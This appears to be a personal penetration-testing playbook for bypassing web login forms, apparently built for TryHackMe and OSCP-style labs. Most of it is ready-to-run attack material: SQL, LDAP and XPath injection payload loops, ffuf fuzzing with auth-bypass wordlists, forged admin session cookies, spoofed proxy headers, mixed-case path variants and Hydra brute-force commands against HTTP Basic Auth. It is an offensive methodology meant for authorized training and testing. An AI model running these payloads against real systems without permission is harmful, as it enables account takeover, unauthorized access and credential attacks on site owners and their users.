
> **STATUS: FORMAT-ONLY** — 2026-09-07: this session applied compliance fixes on encounter during THM Guided Pentest: Web live walk (§§2-8 rewritten to batched-classifier shape; parameter_tampering_probe.sh + tests built and validated). Full first-principles + primary-source audit per V_S (OWASP WSTG, PortSwigger, HackTricks cross-check) not yet performed on any section. §9 Post-success routing still has POST-doctrine gaps flagged but unfixed.

Bypass login without valid credentials — via injection payloads, request tampering, or exploiting server-side auth check flaws. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation.

Ordering: cheap-and-visible first (HTML comments — seconds); injection payload lists (fast, high P on OSCP+ SQLi-vulnerable apps); parameter tampering (fast, defeats naive parsers); direct URL access (fast, defeats routes-only-protected-in-frontend apps); custom header bypass (medium cost, discovery-dependent); HTTP method tampering; case-sensitivity path bypass; HTTP Basic Auth handling.

---

## Pre-flight checks

This playbook requires the following variables. If not already present, derive from [[Static Login Form Prep]]:

- `<login_username_field>`
- `<login_password_field>`
- `<login_form_action>`
- `<login_static_cookies>`
- `<login_static_hidden_fields>` \*
- `<extra_headers>`
- `<req_flags>`
- `<user_agent_header>`
- `<threads>`
- `<oracle_ffuf>`
- `<oracle_curl_success_test>` - wrapped as shell function - call with `curl_oracle`
- `<fail_status>`
- `<fail_marker>`

\* Wherever `<login_static_hidden_fields_appended>` appears at the end of a POST `-d` body, replace it with `&<login_static_hidden_fields>` if non-empty (e.g. `&csrf=abc123`), else with nothing.

## 1. HTML comment inspection

#### HTML Comments:

Devs frequently leave credentials, hints, or debug info in HTML comments on login pages.

`curl -s http://<host>:<port>/<login_path> | grep -oE '<!--[^>]*-->' | head -50`

#### JavaScript Files:

Also inspect JavaScript files linked from login page (may contain hardcoded creds or test users):

`curl -s http://<host>:<port>/<login_path> | grep -oE '<script[^>]*src=["'"'"'][^"'"'"']+' | grep -oE 'src=["'"'"'][^"'"'"']+' | cut -d'"' -f2 | grep -viE '(bootstrap|jquery|angular|react|vue|popper|chart|moment|lodash|underscore|tailwind|font.?awesome|highlight|prism|handlebars|mustache|d3|three|slick|codemirror|ace)'`

For each script URL: `curl -s http://<host>:<port>/<script_path> | grep -iE '(password|passwd|user|admin|token|api[_-]?key)'`

Route:

- Full credentials found in comments or JS → try directly against login form (feed to [[Credential Attacks]] Section 1 default creds pattern with recovered creds)
- Just username(s) → append to `users_<host>.txt`
- Hints found (URLs, endpoints, test accounts) → note for later, 2
- Nothing useful → 2

---

## 2. SQL / LDAP / XPath injection login bypass

Submit injection payloads as username, password, or both. Bypasses vulnerable login queries.

#### Quick manual test — SQL injection classics

⚠️ No trailing-whitespace strip on `U`/`P` — deliberate. MySQL SQLi payloads like `admin' -- ` require the trailing space to parse as a comment; stripping (as [[Credential Attacks]] does for wordlists) silently breaks them.

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS=: read -r U P; do
  if curl_oracle; then echo "SUCCESS $U:$P"; fi
done << 'EOF'
admin' -- :anything
admin' # :anything
admin'/* :anything
' or 1=1 -- :anything
' or 1=1 # :anything
" or 1=1 -- :anything
' or '1'='1 :anything
' or '1'='1' -- :anything
admin' or '1'='1 :anything
' or 1=1 limit 1 -- :anything
') or ('1'='1 :anything
' union select 1,'admin','password' -- :anything
EOF
```


#### Full payload list (large) 

HackTricks curated list — try as username field with fixed password `Pass1234`, then swap:

`ffuf -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt -enc 'FUZZ:urlencode' -X POST -d '<login_username_field>=FUZZ&<login_password_field>=Pass1234<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_sqli_user_<host>_<port>.json -of json`

Then reverse (fixed username, fuzz password):

⚠️ If `<login_username_field>` takes an email-format value, replace `admin` with `admin@<known_domain>` — else server-side validation may silently reject all 96 before SQL.

`ffuf -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt -enc 'FUZZ:urlencode' -X POST -d '<login_username_field>=admin&<login_password_field>=FUZZ<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_sqli_pass_<host>_<port>.json -of json`

#### LDAP injection 

(if backend suspected to use LDAP — Active Directory-integrated apps)

Feed each pair through `curl_oracle`:

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS=: read -r U P; do
  if curl_oracle; then echo "SUCCESS $U:$P"; fi
done << 'EOF'
*)(uid=*))(|(uid=*:anything
*)(&:anything
admin)(&(|(password=*):anything
*)(!(&(|(password=*):anything
EOF
```

#### XPath injection 

(if backend uses XML)

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS=: read -r U P; do
  if curl_oracle; then echo "SUCCESS $U:$P"; fi
done << 'EOF'
' or '1'='1:anything
' or count(/*)>0 or ':anything
'] | //user/*[contains(*, ':anything
EOF
```

#### Route:

- Any ffuf result OR `SUCCESS $U:$P` line (all *candidates*, not confirmed) → verify manually → confirmed → Section 9; false positive → discard, next candidate; on exhaustion → 3
- Exhausted, no success → 3

---

## 3. Parameter tampering

`~/scripts/parameter_tampering_probe.sh --host=<host> --port=<port> --form-action=<login_form_action> --user-field=<login_username_field> --pass-field=<login_password_field> --fail-status=<fail_status> --fail-marker='<fail_marker>' --cookies='<login_static_cookies>' --hidden-fields='<login_static_hidden_fields>' --extra-headers='<extra_headers>' [--delay=<ms>] [--scheme=<http|https>] [--verbose]`

⚠️ If `<fail_marker>` contains a single quote, replace the outer `'...'` around it with `"..."`.

For each `CHECK` line, classify by status first:

- `[302]` → likely bypass; deep-inspect
- `[500]` → app-crash on unexpected input; usually not a bypass, but signal; deep-inspect only if the variant plausibly returns 500 on success (rare)
- `[405]` → method not allowed; dead end for method-swap variants; skip
- `[<fail_status>]` different-content → the fail marker was absent from a fail-status response; deep-inspect
- other `[2xx]` / `[4xx]` → unexpected; deep-inspect

To deep-inspect one CHECK variant at a time:

1. Re-run the script with `--verbose` appended. Note the `WORK_DIR preserved: /tmp/tmp.XXXXXX` line on stderr.
2. `cd` into that WORK_DIR.
3. `ls` to see one `.body` + `.hdr` + `.meta` file per variant. Filenames derive from labels (spaces → underscores, specials stripped).
4. `cat <variant_label>.hdr` — look for `Location: /<non-login-path>`, `Set-Cookie: <session-issuing>`, `WWW-Authenticate:` (unexpected auth challenge).
5. `cat <variant_label>.body` — look for absence of the fail marker (login form HTML), presence of authenticated content (dashboard, user data, admin functions).
6. If any indicator present → auth bypassed → Section 9 (using the variant's payload as the working bypass). If not → next CHECK line.

⚠️ Deep-inspect often reveals stack traces, filesystem paths, framework versions, or SQL errors — information disclosure (CWE-209). Log for engagement report even when the variant is a false positive. Examples: `/var/www/<app>/<script>.php:N`, `Traceback (most recent call last):`, `System.Data.SqlClient.SqlException:`, `PHP Fatal error:`.

Route:

- Any `CHECK` verdict from script (all *candidates*, not confirmed) → classify by status (above), deep-inspect if warranted → confirmed → Section 9 (using variant's payload as the working bypass); false positive → discard, next candidate; on exhaustion → 4
- Script emits `ROUTE: exhausted` (all `fail`, no CHECKs) → 4

---

## 4. Direct URL access to protected pages

Some apps only guard the login page, not the destination. Try common post-login paths; classify each by the final response (following redirects) — `fail` = path missing / protected / login rendered; `CHECK` = something else, worth manual inspection.

⚠️ Make sure to replace all variable placeholders, including `<fail_marker>`.

```bash
for p in /dashboard /admin /profile /account /home /main /index /portal /console /panel; do
  tmp=$(mktemp)
  status=$(curl -sL -o "$tmp" -w '%{http_code}' <user_agent_header> http://<host>:<port>$p)
  case "$status" in
    404)     rm -f "$tmp"; printf 'fail  [%s] %-12s — not found\n' "$status" "$p" ;;
    401|403) rm -f "$tmp"; printf 'fail  [%s] %-12s — protected\n' "$status" "$p" ;;
    *)
      if grep -qF -- '<fail_marker>' "$tmp"; then
        rm -f "$tmp"
        printf 'fail  [%s] %-12s — login rendered\n' "$status" "$p"
      else
        printf 'CHECK [%s] %-12s — inspect %s\n' "$status" "$p" "$tmp"
      fi
      ;;
  esac
done
```

**Fake session cookie test** — one-shot, checks whether the app trusts client-supplied session cookies at face value. 

Set `CANDIDATE` to any path from the loop above with verdict `fail [...] ... login rendered` OR `CHECK` . Skip 401/403 paths (HTTP-level auth, not cookie-based — see Section 7). If ALL loop verdicts were `fail [404] ... not found` or 401/403, skip this test — no cookie-guarded path exists.

⚠️ Make sure to replace all variable placeholders, including `<fail_marker>`.

```bash
CANDIDATE=<a "login rendered" or CHECK path from loop above>
tmp=$(mktemp)
status=$(curl -sL -o "$tmp" -w '%{http_code}' <user_agent_header> -H 'Cookie: session=admin; user=admin; role=admin' http://<host>:<port>$CANDIDATE)
case "$status" in
  401|403) rm -f "$tmp"; printf 'fail  [%s] fake-cookie %s — still protected\n' "$status" "$CANDIDATE" ;;
  *)
    if grep -qF -- '<fail_marker>' "$tmp"; then
      rm -f "$tmp"
      printf 'fail  [%s] fake-cookie %s — login rendered\n' "$status" "$CANDIDATE"
    else
      printf 'CHECK [%s] fake-cookie %s — inspect %s\n' "$status" "$CANDIDATE" "$tmp"
    fi
    ;;
esac
```

#### Route:

- Any `CHECK` verdict from EITHER block above (all *candidates*, not confirmed) → `cat` the printed tmp path for auth-gated content (usernames, user data, admin functions) served without login → confirmed → Section 9 (direct path is authenticated surface); false positive → discard, next candidate; on exhaustion → 5
- All `fail` in both blocks → 5

---

## 5. Custom HTTP header bypass

Some apps trust request headers for auth bypass (typically for internal/proxy contexts); fire common spoof headers against an auth-enforced path from Section 4.

#### Step 1 — Discover proxy-added headers via TRACE (if allowed):

⚠️ `TRACE` is likely disabled (`405 Method Not Allowed` in response), but cheap to run/double check:

`curl -sX TRACE <user_agent_header> -H 'X-Test-Header: test' -i http://<host>:<port>/<login_path>`

If TRACE echoes back header names you did NOT send AND that are NOT already in Step 2's list (proxy/WAF/middleware may insert non-standard names like `X-Backend-Auth`, `X-Forwarded-User`, `X-Proxy-Auth`), add those new names to Step 2's `for h in ...` list before running it.

#### Step 2 — Batch classifier over spoof headers. 

Set `CANDIDATE` to any path from Section 4's loop with verdict `fail [...] ... login rendered` OR `CHECK`. Skip Section 5 entirely if all Section 4 paths returned 404, 401, or 403.

⚠️ Make sure to replace all variable placeholders, including `<fail_marker>`.

```bash
CANDIDATE=<login-rendered or CHECK path from Section 4>
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Remote-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Host: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin"; do
  tmp=$(mktemp)
  status=$(curl -sL -o "$tmp" -w '%{http_code}' <user_agent_header> -H "$h" http://<host>:<port>$CANDIDATE)
  case "$status" in
    404)     rm -f "$tmp"; printf 'fail  [%s] %-40s — not found\n' "$status" "$h" ;;
    401|403) rm -f "$tmp"; printf 'fail  [%s] %-40s — protected\n' "$status" "$h" ;;
    *)
      if grep -qF -- '<fail_marker>' "$tmp"; then
        rm -f "$tmp"
        printf 'fail  [%s] %-40s — login rendered\n' "$status" "$h"
      else
        printf 'CHECK [%s] %-40s — inspect %s\n' "$status" "$h" "$tmp"
      fi
      ;;
  esac
done
```

#### Route:

- Any `CHECK` verdict (all *candidates*, not confirmed) → `cat` the printed tmp path for auth-gated content (usernames, user data, admin functions) served without login → confirmed → Section 9 (using header + path as authenticated surface); false positive → discard, next candidate; on exhaustion → 6
- All `fail` → 6

---
 
## 6. Case-sensitivity path bypass

Server-side path checks that use case-sensitive comparison can be bypassed by mixed-case path variations. Test case variants of the auth-enforced path against the same fail-marker classifier used in Sections 4-5.

The loop below assumes the auth-enforced path is `/admin` (Section 4's most common candidate). If Section 4's `login rendered` or `CHECK` candidate was different, edit the paths in the loop before running.

⚠️ Make sure to replace all variable placeholders, including `<fail_marker>`.

```bash
for p in /admin /Admin /ADMIN /adMin /aDmIn /admin/ /Admin/ /admin.php /Admin.php; do
  tmp=$(mktemp)
  status=$(curl -sL -o "$tmp" -w '%{http_code}' <user_agent_header> http://<host>:<port>$p)
  case "$status" in
    404)     rm -f "$tmp"; printf 'fail  [%s] %-16s — not found\n' "$status" "$p" ;;
    401|403) rm -f "$tmp"; printf 'fail  [%s] %-16s — protected\n' "$status" "$p" ;;
    *)
      if grep -qF -- '<fail_marker>' "$tmp"; then
        rm -f "$tmp"
        printf 'fail  [%s] %-16s — login rendered\n' "$status" "$p"
      else
        printf 'CHECK [%s] %-16s — inspect %s\n' "$status" "$p" "$tmp"
      fi
      ;;
  esac
done
```

#### Route:

- Any `CHECK` verdict (all *candidates*, not confirmed) → `cat` the printed tmp path for auth-gated content served without login → confirmed → Section 9 (using case variant as authenticated surface); false positive → discard, next candidate; on exhaustion → 7
- All `fail` → 7

---

## 7. HTTP Basic Auth handling

If server responds with `WWW-Authenticate: Basic` header, target uses HTTP Basic Auth (different from HTML form).

**Detection.** Set `CANDIDATE` to any path returning 401 or 403 from EITHER Section 4's loop (above) OR prior WAC directory enumeration (gobuster/ffuf). Skip this section entirely if no path from either source returned 401/403 — no protected surface, no Basic Auth target.

`CANDIDATE=<protected path from Section 4>; curl -s -D - -o /dev/null <user_agent_header> http://<host>:<port>$CANDIDATE | grep -i 'WWW-Authenticate'`

Route:

- Output shows `WWW-Authenticate: Basic realm="..."` → Basic Auth in use → continue to attack below
- Empty output → no Basic Auth; skip to 8

**Attack — try default creds via Hydra HTTP Basic module:**

⚠️ Hydra's `H=` APPENDS the UA rather than overriding, so both `Mozilla/4.0 (Hydra)` and the Chrome UA travel on each request. Most WAFs use last-header-wins → Chrome UA effective. WAFs that inspect the first UA header will still block; if hydra 404s/403s where curl succeeds, drop the `H=User-Agent\: ...` clause and accept the default (or switch to `medusa` / `ncrack`).

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt <host> http-get "${CANDIDATE}:H=User-Agent\: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -t <threads> -V`

Or with enumerated user list (if `users_<host>.txt` populated):

`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <host> http-get "${CANDIDATE}:H=User-Agent\: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -t <threads> -V`

**Manual test with curl:**

`curl -u '<user>:<pass>' -i <user_agent_header> http://<host>:<port>$CANDIDATE`

Route:

- Hydra prints `login:` line → verify manually → Section 9
- All combinations exhausted → 8

---

## 8. Miscellaneous bypass checks

Fast final checks before exhaustion.

#### Robots.txt check:

`curl -sL <user_agent_header> http://<host>:<port>/robots.txt`

Any interesting `Disallow: /<path>` → test that path via Sections 4-6 techniques.

#### Backup / alternate login enumeration:

```bash
for p in /login.old /login.bak /login2 /login_test /login.php.bak /login_backup /login.orig /api/login /api/v1/login /api/v2/login /api/auth /oauth/login /admin/login; do
  tmp=$(mktemp)
  status=$(curl -sL -o "$tmp" -w '%{http_code}' <user_agent_header> http://<host>:<port>$p)
  case "$status" in
    404) rm -f "$tmp"; printf 'fail  [%s] %-24s — not found\n' "$status" "$p" ;;
    *)   printf 'CHECK [%s] %-24s — inspect %s\n' "$status" "$p" "$tmp" ;;
  esac
done
```

Any `CHECK` verdict → likely alternate login endpoint or API surface → re-run Sections 1-3 against that endpoint.


#### Route:

- Any `CHECK` from loop or robots hint (all *candidates*, not confirmed) → follow downstream action noted above → confirmed → Section 9; false positive → discard, next candidate; on exhaustion → Exhaustion
- All `fail`, no robots hints, no registration form → **Exhaustion**

---

## 9. Post-success routing

On verified bypass (session cookie, authenticated content, or direct-access foothold):

1. Log to `route_<ip>.txt`:

    `printf '[Login Bypass Techniques] APPLIED: <technique> on <host>:<port><login_path>\n' >> route_<ip>.txt`

2. Capture session state (cookie, header, path — whatever grants the authenticated context):

	`curl -sX POST -i -d '<payload>' http://<host>:<port>/<login_form_action> | grep -iE '^(Set-Cookie|Location):'`

3. Route by post-bypass surface:

- Session cookie granted (opaque OR JWT) → re-walk [[Web Attack Checksheet]] sub-blocks 1.6-1.13 authenticated
- JWT-shaped cookie → also consider [[Session Cookie Attacks]] JWT branch for privilege escalation
- Direct RCE via authenticated feature → escalate to [[Linux Privilege Escalation Checksheet]] / [[Windows Privilege Escalation Checksheet]]
- Admin surface reached with upload/exec feature → [[File Upload]] or relevant WAC technique

---

## Exhaustion

Sections 1-8 all exhausted without bypass → continue [[Web Attack Checksheet]] Step 1 walking.

## Validation

THM:Guided Pentest: Web